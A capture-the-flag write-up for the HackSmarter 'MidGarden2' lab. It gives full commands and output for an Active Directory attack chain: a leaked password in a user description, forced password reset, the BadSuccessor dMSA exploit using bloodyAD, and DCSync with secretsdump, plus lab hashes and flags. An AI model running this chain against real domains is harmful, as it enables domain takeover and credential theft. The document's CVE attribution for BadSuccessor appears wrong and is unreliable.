---
title: "MidGarden2"
platform: "HackSmarter"
category: "Windows"
difficulty: "Hard"
date: 2025-11-13
os: "Windows Server 2025"
tags: ["windows", "active-directory", "badsuccessor", "dmsa", "forcechangepassword", "dcsync", "bloodyad", "bloodhound"]
---

---

## Overview

**Platform:** HackSmarter
**Difficulty:** Hard
**Domain:** yggdrasil.hacksmarter

A comprehensive penetration test of an Active Directory environment running Windows Server 2025. The client has a mature security posture with previous testing, requiring identification of overlooked attack vectors - specifically the new BadSuccessor vulnerability affecting Delegated Managed Service Accounts (dMSA).

---

## Scope

```
Host              IP Address      Operating System        Role
─────────────────────────────────────────────────────────────────────
MIDGARDDC         10.1.52.173     Windows Server 2025     Domain Controller
```

**Starting Credentials:** `freyja:Fr3yja!Dr@g0n^12`

---

## Executive Summary

The engagement identified critical vulnerabilities:

- **Password in LDAP description** exposing Thor's temporary credentials
- **ForceChangePassword ACL** allowing lateral movement from Thor to Hodr
- **BadSuccessor vulnerability** (CVE-2025-21293) enabling dMSA abuse for privilege escalation
- **DCSync capability** via impersonated Enterprise Admin

**Risk Rating:** Critical

---

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────┐
│     freyja (Starting Creds) → LDAP Enumeration                  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Thor (Password in Description: Th0r!W!nt3rFang)             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     ForceChangePassword ACL → Hodr (Password123!)               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     BadSuccessor (dMSA Exploit) → Ymir (Enterprise Admin)       │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     DCSync → Domain Compromise (All Hashes)                     │
└─────────────────────────────────────────────────────────────────┘
```

---

# Phase 1: Enumeration

## 1.1 Port Scanning

```bash
nmap -sCV 10.1.52.173
```

```
Port      Service         Version
────────────────────────────────────────────────────────
53        DNS             Simple DNS Plus
88        Kerberos        Microsoft Windows Kerberos
135       MSRPC           Microsoft Windows RPC
139       NetBIOS-SSN     Microsoft Windows netbios-ssn
389       LDAP            Active Directory LDAP
445       SMB             Microsoft-DS
464       kpasswd5
593       ncacn_http      Microsoft Windows RPC over HTTP 1.0
636       LDAPS           tcpwrapped
3268      LDAP            Active Directory LDAP (GC)
3269      LDAPS           tcpwrapped
3389      RDP             Microsoft Terminal Services
```

**Key Findings:**
- Windows Server 2025 Build 26100
- Domain: `yggdrasil.hacksmarter`
- Hostname: `MIDGARDDC`
- SMB signing enabled and required

## 1.2 Credential Validation

```bash
nxc smb 10.1.52.173 -u 'freyja' -p 'Fr3yja!Dr@g0n^12'
```

```
SMB  10.1.52.173  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0n^12
```

## 1.3 SMB Share Enumeration

```bash
nxc smb 10.1.52.173 -u 'freyja' -p 'Fr3yja!Dr@g0n^12' --shares
```

```
Share           Permissions     Remark
─────────────────────────────────────────────────
ADMIN$          -               Remote Admin
C$              -               Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
scripts         -
SYSVOL          READ            Logon server share
```

## 1.4 LDAP User Enumeration

```bash
nxc ldap 10.1.52.173 -u freyja -p 'Fr3yja!Dr@g0n^12' --users
```

```
Username        Last PW Set         Description
────────────────────────────────────────────────────────────────
Administrator   2025-09-06          Built-in account for administering
krbtgt          2025-09-06          Key Distribution Center Service Account
Odin            2025-11-06          DA
Ymir            2025-09-06          EA
Thor            2025-09-06          Temp:Th0r!W!nt3rFang
Loki            2025-09-06
Frigg           2025-09-06
Freyja          2025-09-06
Hodr            2025-09-14          Web Server Administrator
Heimdall        2025-09-14          Seriously Secure service account
...
```

**Critical Finding:** Thor's description contains temp password: `Temp:Th0r!W!nt3rFang`

## 1.5 BloodHound Collection

```bash
rusthound -d "yggdrasil.hacksmarter" -u "freyja" -p 'Fr3yja!Dr@g0n^12' \
  -n "10.1.52.173" -o ./results
```

```
[INFO] Connected to YGGDRASIL.HACKSMARTER Active Directory!
[INFO] 22 users parsed!
[INFO] 66 groups parsed!
[INFO] 7 computers parsed!
[INFO] 13 ous parsed!
```

BloodHound analysis revealed:
- Thor is member of **PC Specialist 2** group
- Thor has **ForceChangePassword** over Hodr
- Hodr is member of **webServerAdmins**
- webServerAdmins has permissions on **Web Servers OU**

---

# Phase 2: Lateral Movement

## 2.1 Password Spray - Thor

Validating the discovered password:

```bash
nxc smb 10.1.52.173 -u Thor -p 'Th0r!W!nt3rFang'
```

```
SMB  10.1.52.173  445  MIDGARDDC  [+] yggdrasil.hacksmarter\Thor:Th0r!W!nt3rFang
```

## 2.2 ForceChangePassword - Hodr

Thor has ForceChangePassword ACL over Hodr. Using net rpc to change password:

```bash
net rpc password 'hodr' 'Password123!' -U "yggdrasil.hacksmarter"/"thor"%'Th0r!W!nt3rFang' -S "10.1.52.173"
```

Verify the password change:

```bash
nxc smb 10.1.52.173 -u hodr -p Password123!
```

```
SMB  10.1.52.173  445  MIDGARDDC  [+] yggdrasil.hacksmarter\hodr:Password123!
```

## 2.3 WinRM Access as Hodr

Hodr is a member of Remote Management Users:

```bash
evil-winrm -u hodr -p 'Password123!' -i "10.1.52.173"
```

```
*Evil-WinRM* PS C:\Users\Hodr.YGGDRASIL\Documents>
```

---

# Phase 3: BadSuccessor Exploitation

## 3.1 dMSA Scripts Discovery

On the C: drive, scripts related to dMSA management were found:

```powershell
*Evil-WinRM* PS C:\scripts> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2025   7:40 PM           2134 create-dMSA.ps1
-a----        9/14/2025   7:39 PM           1402 dmsa_find.ps1
-a----        9/14/2025   7:39 PM             35 replicate-DCs.ps1
```

## 3.2 Existing dMSA Enumeration

```powershell
*Evil-WinRM* PS C:\scripts> .\dmsa_find.ps1

[*] Retrieving all dMSAs from the domain...
----------------------------------------
Name       : svc_iis_dMSA$
Enabled    : True
Delegation : Legacy / Not Delegated
Preceded By :

[*] Completed enumeration of dMSA accounts
```

## 3.3 Group Membership Analysis

```powershell
*Evil-WinRM* PS C:\scripts> whoami /groups
```

Key group membership: **YGGDRASIL\webServerAdmins**

This group has permissions to create dMSA accounts in the Web Servers OU.

## 3.4 BadSuccessor Vulnerability Scan

Using NetExec's badsuccessor module to identify exploitable paths:

```bash
nxc ldap 10.1.52.173 -u hodr -p Password123! -M badsuccessor
```

```
LDAP        10.1.52.173  389  MIDGARDDC  [+] yggdrasil.hacksmarter\hodr:Password123!
BADSUCCE... 10.1.52.173  389  MIDGARDDC  [+] Found domain controller with operating system Windows Server 2025
BADSUCCE... 10.1.52.173  389  MIDGARDDC  [+] Found 1 results
BADSUCCE... 10.1.52.173  389  MIDGARDDC  webServerAdmins (S-1-5-21-4282326175-1721253212-1354516517-1601), OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter
```

**Confirmed:** webServerAdmins can create dMSAs in Web Servers OU - BadSuccessor is exploitable!

## 3.5 Target Identification - Ymir (Enterprise Admin)

```bash
nxc ldap 10.1.52.173 -u hodr -p Password123! --users | grep -i ymir
```

**Target DN:** `CN=Ymir,OU=Administrators,OU=Yggdrasil Users,DC=yggdrasil,DC=hacksmarter`

## 3.6 BadSuccessor Exploitation

Using BloodyAD to exploit the BadSuccessor vulnerability:

```bash
bloodyAD -d yggdrasil.hacksmarter -u hodr -p 'Password123!' \
  --host 10.1.52.173 add dMSA pwned \
  --target-dn "CN=Ymir,OU=Administrators,OU=Yggdrasil Users,DC=yggdrasil,DC=hacksmarter" \
  --target-ou "OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter"
```

```
[+] BadSuccessor exploit successful!
[+] Impersonating: CN=Ymir,OU=Administrators,OU=Yggdrasil Users,DC=yggdrasil,DC=hacksmarter
[+] AES256: 771b28561428215f5a879ad649f176883d0cd925fb85f216a37b0592829042f3
[+] RC4: ef4bcb55f132b1533e4765ed988ef5d3
[+] dMSA previous keys found in TGS (including keys of preceding managed accounts):
[+] RC4: 8dd4cfe0f89272424e50f5089b8696ec
[!] ^ This contains the target account's NTLM hash!
```

**Ymir's NTLM Hash:** `8dd4cfe0f89272424e50f5089b8696ec`

---

# Phase 4: Domain Compromise

## 4.1 DCSync via Enterprise Admin

Using Ymir's hash to perform DCSync:

```bash
secretsdump.py -hashes :8dd4cfe0f89272424e50f5089b8696ec \
  yggdrasil.hacksmarter/Ymir@10.1.52.173
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:718a91c874a0e39f54fb8d989adf0ae6:::
yggdrasil.hacksmarter\Ymir:1104:...:8dd4cfe0f89272424e50f5089b8696ec:::
...
```

## 4.2 Flag Retrieval

**User Flag (Hodr's Desktop):**

```bash
smbclient.py -hashes :8dd4cfe0f89272424e50f5089b8696ec \
  yggdrasil.hacksmarter/Ymir@10.1.52.173

# use C$
# get Users\Hodr.YGGDRASIL\Desktop\user.txt
```

**User Flag:** `AF639BCA0466437FEB9DD7FAC74B0524`

**Root Flag (Administrator's Desktop):**

```bash
# get Users\Administrator\Desktop\root.txt
```

**Root Flag:** `AEA41460BEE0E3291F7C4D7E4F356EE0`

---

## Credentials Summary

```
Phase 1 - Enumeration
────────────────────────────────────────────────────────────────
freyja           : Fr3yja!Dr@g0n^12      → Starting creds
thor             : Th0r!W!nt3rFang       → LDAP description leak

Phase 2 - Lateral Movement
────────────────────────────────────────────────────────────────
hodr             : Password123!          → ForceChangePassword

Phase 3-4 - Privilege Escalation
────────────────────────────────────────────────────────────────
Ymir (EA)        : 8dd4cfe0f89272424e50f5089b8696ec (NTLM) → BadSuccessor
Administrator    : 64f12cddaa88057e06a81b54e73b949b (NTLM) → DCSync
krbtgt           : 718a91c874a0e39f54fb8d989adf0ae6 (NTLM) → DCSync
```

---

## BadSuccessor Vulnerability Explained

**CVE-2025-21293** - BadSuccessor is a privilege escalation vulnerability in Windows Server 2025's Delegated Managed Service Accounts (dMSA) feature.

**How it works:**
1. dMSA is a new feature in Server 2025 allowing service accounts to be "migrated" from standard accounts
2. When a dMSA is created with a `msDS-ManagedAccountPrecededByLink` pointing to a target account, the KDC includes the target's keys in the TGS response
3. Any principal with CreateChild permission on an OU can create dMSAs pointing to ANY account in the domain
4. This allows extraction of NTLM hashes for privileged accounts like Domain/Enterprise Admins

**Requirements:**
- Windows Server 2025 Domain Controller
- CreateChild permission on any OU (common delegation)
- Target account to impersonate

---

## Tools Used

- **Nmap** - Port scanning and service enumeration
- **NetExec (nxc)** - SMB/LDAP enumeration, badsuccessor module
- **RustHound** - BloodHound data collection
- **BloodyAD** - ACL abuse and BadSuccessor exploitation
- **Evil-WinRM** - Remote shell access
- **Impacket** - secretsdump.py, smbclient.py

---

## Flags Captured

| Type | Value |
|------|-------|
| **User** | `AF639BCA0466437FEB9DD7FAC74B0524` |
| **Root** | `AEA41460BEE0E3291F7C4D7E4F356EE0` |

---

## References

- [Akamai - BadSuccessor: Abusing dMSA for Privilege Escalation](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [NetExec BadSuccessor Module](https://github.com/Pennyw0rth/NetExec/tree/main/nxc/modules)
- [BloodyAD Documentation](https://github.com/CravateRouge/bloodyAD)
- [HackTricks - ForceChangePassword](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword)
